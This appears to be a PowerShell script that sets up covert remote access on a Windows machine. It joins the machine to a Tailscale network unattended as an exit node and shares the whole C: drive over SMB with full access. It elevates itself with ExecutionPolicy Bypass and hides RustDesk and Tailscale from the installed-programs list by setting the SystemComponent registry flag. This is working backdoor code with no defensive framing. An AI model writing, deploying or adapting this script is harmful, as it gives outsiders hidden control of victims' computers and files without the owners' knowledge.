tailscale down
cls
tailscale up --auth-key=YOURKEYHERE
tailscale up --reset
tailscale down
cls
New-SmbShare -Name bgmorito -Path "C:\" -FullAccess "Administrateurs"
cls


if (-Not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
    if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000)
    {
        Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
        Exit;
    } }
cls
$RegPaths = @(
"HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
"HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
"HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$AppsToHide = @(
"*RustDesk*",
"*Tailscale*"
)
foreach ($App in $AppsToHide) {
foreach ($Path in $RegPaths) {
$AppKey = (Get-ItemProperty $Path -ErrorAction SilentlyContinue| Where-Object { $_.DisplayName -like $($App) }).PSPath
if ($null -ne $AppKey) {
$SystemComponent = Get-ItemProperty $AppKey -Name SystemComponent -ErrorAction SilentlyContinue
if (!($SystemComponent)) {
New-ItemProperty "$AppKey" -Name "SystemComponent" -Value 1 -PropertyType DWord
}
else {
$SystemComponentValue = (Get-ItemProperty $AppKey -Name SystemComponent -ErrorAction SilentlyContinue).SystemComponent
if ($SystemComponentValue -eq 0) {
Set-ItemProperty "$AppKey" -Name "SystemComponent" -Value 1
} } } } }
cls

Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableNotificationCenter" -Value 0
cls
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -Value 1
cls

tailscale up --reset
cls
tailscale up --accept-dns --accept-routes --advertise-exit-node --auth-key=YOURKEYHERE --unattended
cls